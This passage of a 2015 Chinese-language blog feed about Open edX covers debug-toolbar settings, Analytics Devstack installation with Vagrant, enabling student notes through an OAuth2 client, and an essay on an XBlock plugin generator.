&lt;span class="n"&gt;MIDDLEWARE_CLASSES&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;django_comment_client.utils.QueryCountDebugMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                       &lt;span class="s1"&gt;&amp;#39;debug_toolbar.middleware.DebugToolbarMiddleware&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt;
&lt;span class="n"&gt;INTERNAL_IPS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt;

&lt;span class="n"&gt;DEBUG_TOOLBAR_PANELS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.version.VersionDebugPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.timer.TimerDebugPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="c1"&gt;#&amp;#39;debug_toolbar.panels.settings_vars.SettingsVarsDebugPanel&amp;#39;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.headers.HeaderDebugPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="c1"&gt;#&amp;#39;debug_toolbar.panels.request_vars.RequestVarsDebugPanel&amp;#39;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.request.RequestPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.sql.SQLDebugPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.signals.SignalDebugPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.cache.CachePanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="c1"&gt;#&amp;#39;debug_toolbar.panels.logger.LoggingPanel&amp;#39;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.logging.LoggingPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="c1"&gt;#&amp;#39;debug_toolbar.panels.staticfiles.StaticFilesPanel&amp;#39;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.templates.TemplatesPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar.panels.redirects.RedirectsPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;debug_toolbar_mongo.panel.MongoDebugPanel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="c1"&gt;#&amp;#39;memcache_toolbar.panels.memcache.MemcachePanel&amp;#39;,&lt;/span&gt;
    &lt;span class="c1"&gt;#pip install git+https://github.com/ross/memcache-debug-panel.git  (to use memcache_toolbar)&lt;/span&gt;

    &lt;span class="c1"&gt;#  Enabling the profiler has a weird bug as of django-debug-toolbar==0.9.4 and&lt;/span&gt;
    &lt;span class="c1"&gt;#  Django=1.3.1/1.4 where requests to views get duplicated (your method gets&lt;/span&gt;
    &lt;span class="c1"&gt;#  hit twice). So you can uncomment when you need to diagnose performance&lt;/span&gt;
    &lt;span class="c1"&gt;#  problems, but you shouldn&amp;#39;t leave it on.&lt;/span&gt;
    &lt;span class="c1"&gt;#  &amp;#39;debug_toolbar.panels.profiling.ProfilingPanel&amp;#39;,&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="n"&gt;DEBUG_TOOLBAR_CONFIG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;INTERCEPT_REDIRECTS&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;SHOW_TOOLBAR_CALLBACK&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;启动调试环境:&lt;code&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms runserver 0.0.0.0:5000 --settings aws&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 25 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-25:use-django-debug-toolbar-1.3.2-in-edx.html</guid><category>edx</category></item><item><title>appsembler发布edx-lite-cypress</title><link>/appsembler-edx-lite-cypress.html</link><description>&lt;p&gt;appsembler于8天前在docker hub上发布edx-lite-cypress.该版本是为开发者准备的&lt;/p&gt;
&lt;p&gt;我在本地使用一切正常，十分适合用于开发协作&lt;/p&gt;
&lt;p&gt;大家可以拉取试用:&lt;code&gt;docker pull appsembler/edx-lite-cypress&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 23 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-23:appsembler-edx-lite-cypress.html</guid><category>edx</category></item><item><title>edX发布Analytics Developer Stack</title><link>/Installing-the-Open-edX-Analytics-Developer-Stack.html</link><description>&lt;p&gt;Gabe Mulley上周在&lt;a href="https://open.edx.org"&gt;open.edx.org&lt;/a&gt;里公布说Development Environment for Insights已经可用了，原文参考&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/devstack/analytics_devstack.html#install-the-software-prerequisites"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文章说这项成果要大大地感谢Philippe Chiu (来自法国IONISx公司)，以及Braden MacDonald (来自OpenCraft公司),前者在去年的黑客马拉松里贡献了最初的模型（跑在Docker里），我之前好像有拿到这个版本，但似乎略微杂乱。后者给出了vagrant image&lt;/p&gt;
&lt;p&gt;下图是analytics devstack包含的服务流程图&lt;/p&gt;
&lt;p&gt;&lt;img alt="Analyticstack" src="img/edx/analysis/Analyticstack.png" /&gt;&lt;/p&gt;
&lt;p&gt;据我所知，这项工作Gabe Mulley自己是做了很多工作的，我一直有跟进这块，大家在google group里谈论数据可视化这块时，Gabe Mulley一直致力于为大家解答，在edX开发者中，他对数据这部分似乎也最为熟悉&lt;/p&gt;
&lt;p&gt;目前这部分还没有十分成熟，问题包括一些s3的依赖还没有清理干净。但这些问题正在被解决&lt;/p&gt;
&lt;p&gt;可喜的是，之后很可能可以直接将数据分析整合到生产环境里（有望在下个稳定版本），不需要依赖于亚马逊的服务，意味着国内可以直接使用。&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;首先和devstack一样，需要安装 VirtualBox &amp;gt;= 4.3.12
和 Vagrant &amp;gt;= 1.6.5,没有安装devstack经验的同学，可以参考&lt;a href="https://github.com/edx/configuration/wiki/edX-Developer-Stack#installing-the-edx-developer-stack"&gt;installing-the-edx-developer-stack&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#在宿主机(host)&lt;/span&gt;
sudo apt-get install python-dev
git clone https://github.com/edx/edx-analytics-pipeline
&lt;span class="nb"&gt;cd&lt;/span&gt; edx-analytics-pipeline
virtualenv venv
&lt;span class="nb"&gt;source&lt;/span&gt; venv/bin/activate
make bootstrap

mkdir analyticstack
&lt;span class="nb"&gt;cd&lt;/span&gt; analyticstack
curl -L https://raw.github.com/edx/configuration/master/vagrant/release/analyticstack/Vagrantfile &amp;gt; Vagrantfile
vagrant plugin install vagrant-vbguest
sudo apt-get install nfs-kernel-server nfs-common portmap
vagrant up
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;使用&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#进入Analytics Devstack&lt;/span&gt;
vagrant ssh

&lt;span class="c1"&gt;#切换到edxapp用户&lt;/span&gt;
sudo su edxapp

&lt;span class="c1"&gt;#启用edX Analytics Data API&lt;/span&gt;
sudo su analytics_api
~/venvs/analytics_api/bin/python ~/analytics_api/manage.py runserver 0.0.0.0:8100 --insecure

&lt;span class="c1"&gt;#运行edX Insights&lt;/span&gt;
sudo su insights
~/venvs/insights/bin/python ~/edx_analytics_dashboard/manage.py switch display_verified_enrollment on --create
~/venvs/insights/bin/python ~/edx_analytics_dashboard/manage.py switch enable_course_api on --create
~/venvs/insights/bin/python ~/edx_analytics_dashboard/manage.py runserver 0.0.0.0:8110 --insecure
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;用浏览器打开：&lt;code&gt;http://127.0.0.1:8110&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;执行数据分析任务(edX Analytics Pipeline)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;vagrant ssh进入devstack，注册用户，注册课程&lt;/li&gt;
&lt;li&gt;开始学习，回答几道课程中的问题&lt;/li&gt;
&lt;li&gt;退出devstack，回到宿主机，进入edx-analytics-pipeline目录&lt;/li&gt;
&lt;li&gt;执行任务&lt;ul&gt;
&lt;li&gt;统计注册信息：&lt;ul&gt;
&lt;li&gt;export WHEEL_URL=http://edx-wheelhouse.s3-website-us-east-1.amazonaws.com/Ubuntu/precise&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;remote-task --vagrant-path &lt;path to &lt;code&gt;analyticstack&lt;/code&gt;&gt; --remote-name devstack --override-config ${PWD}/config/devstack.cfg --wheel-url $WHEEL_URL --wait \
   ImportEnrollmentsIntoMysql --local-scheduler --interval-end $(date +%Y-%m-%d -d "tomorrow") --n-reduce-tasks 1&lt;/li&gt;
&lt;li&gt;统计答案分布：&lt;ul&gt;
&lt;li&gt;export WHEEL_URL=http://edx-wheelhouse.s3-website-us-east-1.amazonaws.com/Ubuntu/precise&lt;/li&gt;
&lt;li&gt;export UNIQUE_NAME=$(date +%Y-%m-%dT%H_%M_%SZ)&lt;/li&gt;
&lt;li&gt;remote-task --vagrant-path &lt;path to &lt;code&gt;analyticstack&lt;/code&gt;&gt; --remote-name devstack --override-config &lt;span class="math"&gt;\({PWD}/config/devstack.cfg --wheel-url $WHEEL_URL --wait \  
AnswerDistributionWorkflow --local-scheduler \  
  --src hdfs://localhost:9000/data/ \  
  --include '*tracking.log*' \  
  --dest hdfs://localhost:9000/edx-analytics-pipeline/output/answer_distribution_raw/\)&lt;/span&gt;UNIQUE_NAME/data \&lt;br /&gt;
  --name &lt;span class="math"&gt;\(UNIQUE_NAME \  
  --output-root hdfs://localhost:9000/edx-analytics-pipeline/output/answer_distribution/ \  
  --marker hdfs://localhost:9000/edx-analytics-pipeline/output/answer_distribution_raw/\)&lt;/span&gt;UNIQUE_NAME/marker \&lt;br /&gt;
  --n-reduce-tasks 1  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://open.edx.org/blog/development-environment-open-edx-insights"&gt;A Development Environment for Open edX Insights&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/devstack/analytics_devstack.html"&gt;Installing the Open edX Analytics Developer Stack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;script type="text/javascript"&gt;if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {
    var align = "center",
        indent = "0em",
        linebreak = "false";

    if (false) {
        align = (screen.width &lt; 768) ? "left" : align;
        indent = (screen.width &lt; 768) ? "0em" : indent;
        linebreak = (screen.width &lt; 768) ? 'true' : linebreak;
    }

    var mathjaxscript = document.createElement('script');
    var location_protocol = (false) ? 'https' : document.location.protocol;
    if (location_protocol !== 'http' &amp;&amp; location_protocol !== 'https') location_protocol = 'https:';
    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';
    mathjaxscript.type = 'text/javascript';
    mathjaxscript.src = location_protocol + '//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML';
    mathjaxscript[(window.opera ? "innerHTML" : "text")] =
        "MathJax.Hub.Config({" +
        "    config: ['MMLorHTML.js']," +
        "    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' }, Macros: {} }," +
        "    jax: ['input/TeX','input/MathML','output/HTML-CSS']," +
        "    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js']," +
        "    displayAlign: '"+ align +"'," +
        "    displayIndent: '"+ indent +"'," +
        "    showMathMenu: true," +
        "    messageStyle: 'normal'," +
        "    tex2jax: { " +
        "        inlineMath: [ ['\\\\(','\\\\)'] ], " +
        "        displayMath: [ ['$$','$$'] ]," +
        "        processEscapes: true," +
        "        preview: 'TeX'," +
        "    }, " +
        "    'HTML-CSS': { " +
        "        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} }," +
        "        linebreaks: { automatic: "+ linebreak +", width: '90% container' }," +
        "    }, " +
        "}); " +
        "if ('default' !== 'default') {" +
            "MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
            "MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
        "}";
    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);
}
&lt;/script&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 22 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-22:Installing-the-Open-edX-Analytics-Developer-Stack.html</guid><category>edx</category></item><item><title>在edX Cypress中启用notes功能</title><link>/use-notes-in-cypress.html</link><description>&lt;p&gt;以下内容基于Cypress版本&lt;/p&gt;
&lt;p&gt;根据&lt;a href="http://edx.readthedocs.org/projects/open-edx-building-and-running-a-course/en/named-release-birch/exercises_tools/student_notes.html"&gt;student_notes&lt;/a&gt;的说法，在&lt;code&gt;Advanced Settings&lt;/code&gt;中将&lt;code&gt;Enable Student Note&lt;/code&gt;设置为true,结果并没有像文档说的那样，一点击notes tab就报错。于是查看错误日志发现&lt;code&gt;OAuth2 Client with name 'edx-notes' is not present in the DB&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是翻看notesserver的配置文件，查看相关参数：&lt;a href="https://github.com/edx/edx-notes-api/blob/master/notesserver/settings/common.py#L19"&gt;common.py&lt;/a&gt;，发现：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ID and Secret used for authenticating JWT Auth Tokens&lt;/span&gt;
&lt;span class="c1"&gt;# should match those configured for `edx-notes` Client in EdX&amp;#39;s /admin/oauth2/client/&lt;/span&gt;
&lt;span class="n"&gt;CLIENT_ID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;edx-notes-id&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;CLIENT_SECRET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;edx-notes-secret&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;根据提示到/admin中添加client&lt;/p&gt;
&lt;p&gt;&lt;img alt="note1" src="img/edx/notes/note1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;然后笔记功能就可用了&lt;/p&gt;
&lt;p&gt;&lt;img alt="note2" src="img/edx/notes/note2.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;这个特性十分强大，可以批注课程内容中的大多数东西，从html到pdf。学生可以用笔记复习，做检索之类的&lt;/p&gt;
&lt;p&gt;不过目前还有个问题笔记无法保存到后端（看了下原因是笔记服务没有被配置到nginx上，insights也是因此无法使用）。对，这的确是个大问题！为何我这么冷静
,见后续.如果最新的文档是坑人的，我们就需要自己配置好nginx了。其实也并不麻烦，安装时，在&lt;a href="https://github.com/edx/configuration/blob/master/playbooks/edx_sandbox.yml"&gt;edx_sandbox.yml&lt;/a&gt;启用notes就好&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;群里有小伙伴反馈说没有找到&lt;code&gt;Enable Student Note&lt;/code&gt;,可以到lms(cms).env.json的FEATURES里加上&lt;code&gt;"ENABLE_EDXNOTES": true,&lt;/code&gt;，之后记得&lt;code&gt;restart edxapp:&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在Cypress的lms.env.json里我们看到&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &amp;quot;EDXNOTES_INTERNAL_API&amp;quot;: &amp;quot;http://localhost:18120/api/v1&amp;quot;,
    &amp;quot;EDXNOTES_PUBLIC_API&amp;quot;: &amp;quot;http://localhost:18120/api/v1&amp;quot;,
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这应该就是笔记无法保存到后端的原因。解决方案上边已经给出&lt;/p&gt;
&lt;p&gt;记得将localhost改为你的ip。&lt;/p&gt;
&lt;h1&gt;花絮&lt;/h1&gt;
&lt;p&gt;@mt兄发现，在Advanced Settings中可以启用计算器组件，启用之后会和笔记组件并列在右下角，看去很萌，不过这可是个强大的科学计算器啊：
&lt;img alt="note1" src="img/edx/notes/note3.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;另外根据Advanced Settings的说法，估计不久聊天组件也就可用了&lt;/p&gt;
&lt;h1&gt;后续&lt;/h1&gt;
&lt;p&gt;据官方&lt;a href="http://edx.readthedocs.org/projects/open-edx-building-and-running-a-course/en/latest/exercises_tools/notes.html"&gt;最新文档&lt;/a&gt;说，在latest版本中，这个功能是默认可用的，不过我觉得在admin中申请client的工作还是要做的吧。有试过的同学欢迎发邮件吐槽，我就可以把这篇文章下架了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 22 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-22:use-notes-in-cypress.html</guid><category>edx</category></item><item><title>偷懒,技术与理想</title><link>/lazy-technology-dream.html</link><description>&lt;blockquote&gt;
&lt;p&gt;偷懒是程序员的美德&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;从xblock插件生成器说起&lt;/h1&gt;
&lt;p&gt;这是我最近的一个业余项目。用了两个周末午后的时间&lt;/p&gt;
&lt;p&gt;我对插件机制一直饱含兴趣，这种东西,技术上关系到系统的灵活性，而商业上关系到对需求的适应能力&lt;/p&gt;
&lt;p&gt;对edX的扩展，官方给出了&lt;a href="https://open.edx.org/extending-edx"&gt;四种手段&lt;/a&gt;，最令我激动的是xblock。关于xblock我此前有写过&lt;a href="http://wwj718.github.io/about-XBlocks.html"&gt;介绍文章&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;缘起&lt;/h2&gt;
&lt;p&gt;前前后后，我自己写的xblock加上fork自国外的一些，合计有十几个了。写多了你会发现，xblock是极其强大的扩展机制，它比LTI的扩展性好，又比djangoapp来得简易，以至于大多数教育相关的商业点子，很适合以edX为基础平台，利用xblock作为定制机制，对很多需求就足够了。&lt;/p&gt;
&lt;p&gt;写多了xblock又发现，每个插件的结构是大同小异的，无非是改改存储字段名（字段类型大多都不要动，多是String），改下项目名称，许多其他的命名都以项目名称为前缀，以至于我每回开始写新的xblock，都是先cp旧的，然后使用&lt;code&gt;rename 's/old_repo_name/new_repo_name/'&lt;/code&gt;，&lt;code&gt;grep -rl "old_repo_name" ./ | xargs sed -i 's/old_repo_name/new_repo_name/g'&lt;/code&gt;以及&lt;code&gt;grep -rl "old_field_name" ./ | xargs sed -i 's/old_field_name/new_field_name/g'&lt;/code&gt;来作为新xblock的基本框架，以省去复制粘贴&lt;/p&gt;
&lt;p&gt;这样又写了几个插件后发现依然有不少重复劳动，于是就想为何不写一个xblock插件生成器呢。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;当我们陷入重复劳动的时候，可能就是合适的时机来考虑如何自动化这项工作了，以便能省下时间来喝咖啡。而且我们知道，重复乏味的劳动中，人是容易出错的，而机器不知疲倦，所以偷懒是程序员的美德&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;思路&lt;/h2&gt;
&lt;p&gt;我的设想里，xblock插件生成器做的是这样的工作：开发者将项目名，所需存储字段，字段属性，，项目依赖的外部静态文件等写入config.json配置文件（或者config.yml/config.py），而后自动生成xblock，而后只需要做些微调以及在指定位置加入自己的业务代码,一个插件便可用了。&lt;/p&gt;
&lt;p&gt;这里的主要工作是将琐碎的工作自动化，然后提供一个通用的模板，给出大多的备选功能（属性或函数，默认以注释掉的方式存在于生成的xblock中），尽量按照现有的xblock组件布局方式，现有的xblock组件可以参考&lt;a href="https://github.com/edx/edx-platform/wiki/List-of-XBlocks"&gt;这里&lt;/a&gt;，这样一来，熟练的开发者不需要参考文档，仅需要取消注释，做些微调，就足以快速地完成工作，没错，眼尖的你可能已经看出来了，这是ROR中致力于鼓吹的&lt;code&gt;convention over configuration&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此外，说到设计原则，关于灵活性部分，我喜欢&lt;code&gt;Open Closed Principle&lt;/code&gt;原则（也就是著名开放封闭原则），对扩展开放，对修改关闭。xblock满足这点,我很喜欢&lt;/p&gt;
&lt;h2&gt;设计原则&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Open Closed Principle（开放封闭原则）&lt;/li&gt;
&lt;li&gt;convention over configuration （约定优于配置）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;技术细节&lt;/h2&gt;
&lt;p&gt;剩下的就是技术细节的工作了。&lt;/p&gt;
&lt;p&gt;我最初想以&lt;a href="https://github.com/mitsuhiko/jinja2"&gt;jinja2&lt;/a&gt;模板为基础,
我们知道ansible之类的大型项目也够选择了jinja2，这的确是个优秀的模板引擎。而后发现了&lt;a href="https://github.com/audreyr/cookiecutter"&gt;cookiecutter&lt;/a&gt;,这个工具进一步简化了工作，于是决定基于它来写xblock插件生成器，这样一来根据配置文件来自动生成文件名的问题都解决了&lt;/p&gt;
&lt;h2&gt;遇到的问题&lt;/h2&gt;
&lt;p&gt;这里存在一个很有意思的问题，它和正则相关，cookiecutter用的是标准的jinja2模板，jinja2模版的语法和django相似，而xblock中的模板我用的是django而不是mako，这样一来就导致xblock中有一部分&lt;code&gt;{{var}}&lt;/code&gt;，我们是想等xblock来渲染，结果却被cookiecutter先渲染了。这个问题可以通过更改jinja2语法风格来解决，或是通过使用mako模板来解决。我是quick and dirty的方式解决的。用到了正则&lt;/p&gt;
&lt;h1&gt;此类问题&lt;/h1&gt;
&lt;p&gt;此类问题，或者说代码生成器问题(generator),十分吸引人,它本质上是字符处理问题（我觉得&lt;code&gt;宏&lt;/code&gt;的本质也是这个），这类问题的极致形态是写一个parser，而一般形态是使用正则，当然使用模板往往是个捷径。&lt;/p&gt;
&lt;h1&gt;xblock市场的构想&lt;/h1&gt;
&lt;p&gt;个人而言，我很看好edX，我一直相信xblock本身足以形成插件市场，我觉得以此作为出发点，构建一个咨询/定制/服务型的公司是很有意思的，我喜欢《黑客与画家》第六章提到的观点：&lt;code&gt;财富就是创造人们需要的东西&lt;/code&gt;，我们可以看到即便是国内，这个需求也已经越来越膨胀却没有找到出口。我们今天可以看到，edx这个项目本身是很诱人的，许多教育业内人士与公司都跃跃欲试，而edx的技术门槛确实个拦路虎，那么提供edx相关的技术/开发咨询/培训，提供定制化的服务（插件定制），降低开发的门槛等等，是许多企业客户期待的，当然也是对推广edx本身很有价值的，我的兴趣点之一可能在这里吧，&lt;code&gt;让技术变得易于使用，能方便地用来应对现实问题&lt;/code&gt;，我此前折腾docker，折腾云服务，折腾LTI，此次写的xblock生成器，可能都是受此观念的驱动吧&lt;/p&gt;
&lt;p&gt;有了xblock插件生成器，我们尤其适合做一些为课程深度定制的组件，快速完成插件的基础上，又可以据此作为模板生成其他组件。&lt;/p&gt;
&lt;p&gt;前段时间给公司展示了我业余时间折腾的d3组件,&lt;a href="http://jaredforsyth.com/treed/"&gt;treed&lt;/a&gt;,十分适合结合到edx中，作为呈现知识的方式，类似思维导图 ,d3的案例千千万:&lt;a href="http://bl.ocks.org/mbostock"&gt;bl.ocks.org&lt;/a&gt;，如果能将此领域与教育领域结合,首先市场部势必会很兴奋，有了xblock插件生成器，将d3组件移植到xblock就变得十分迅速。而这些还仅仅是d3。类似的组件还有许多，这里的核心想法是，&lt;code&gt;通过xblock这种插件机制，我们可以将其他领域的成果（好比数据可视化），轻易得整合到教育中，所谓学科融合&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如此一来，结合具体学科，快速打造易用性的组件就变得容易，易用性很可能要求高度的定制化，由此带来通用性的损失，而有了插件生成器，大量打造定制化的插件，时间成本也不至于太高，成本一旦降低，作为商业性的服务就容易被接受。&lt;/p&gt;
&lt;p&gt;该组件可能暂时不会开源，想先进一步优化它，可能的话想以此试水xblock市场&lt;/p&gt;
&lt;h1&gt;花絮&lt;/h1&gt;
&lt;p&gt;在写完大体框架的时候，打了个 v0.1 tag，觉得后续的改良还很多，出于谦虚的姿态，版本号慢慢来，而后又花了一个周末的下午，觉得妈蛋好像主要的事都做完了，直接打了个v1.0的tag。而后顺便把将MTV中的T（Template）换成了mako，于是mako/v1.0也出来了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 15 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-15:lazy-technology-dream.html</guid><category>edx</category></item><item><title>从xblock插件生成器说起</title><link>/xblock-generator-and-others.html</link><description>&lt;blockquote&gt;
&lt;p&gt;偷懒是程序员的美德&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是我最近的一个业余项目。用了两个周末午后的时间&lt;/p&gt;
&lt;p&gt;我对插件机制一直饱含兴趣，这种东西,技术上关系到系统的灵活性，而商业上关系到对需求的适应能力&lt;/p&gt;
&lt;p&gt;对edX的扩展，官方给出了&lt;a href="https://open.edx.org/extending-edx"&gt;四种手段&lt;/a&gt;，最令我激动的是xblock。关于xblock我此前有写过&lt;a href="http://wwj718.github.io/about-XBlocks.html"&gt;介绍文章&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;前前后后，我自己写的xblock加上fork自国外的一些，合计有十几个了。写多了你会发现，xblock是极其强大的扩展机制，它比LTI的扩展性好，又比djangoapp来得简易，以至于大多数教育相关的商业点子，很适合以edX为基础平台，利用xblock作为定制机制，对很多需求就足够了。&lt;/p&gt;
&lt;p&gt;写多了xblock又发现，每个插件的结构是大同小异的，无非是改改存储字段名（字段类型大多都不要动，多是String），改下项目名称，许多其他的命名都以项目名称为前缀，以至于我每回开始写新的xblock，都是先cp旧的，然后使用&lt;code&gt;rename 's/old_repo_name/new_repo_name/'&lt;/code&gt;，&lt;code&gt;grep -rl "old_repo_name" ./ | xargs sed -i 's/old_repo_name/new_repo_name/g'&lt;/code&gt;以及&lt;code&gt;grep -rl "old_field_name" ./ | xargs sed -i 's/old_field_name/new_field_name/g'&lt;/code&gt;来作为新xblock的基本框架，以省去复制粘贴&lt;/p&gt;
&lt;p&gt;这样又写了几个插件后发现依然有不少重复劳动，于是就想为何不写一个xblock插件生成器呢。&lt;/p&gt;
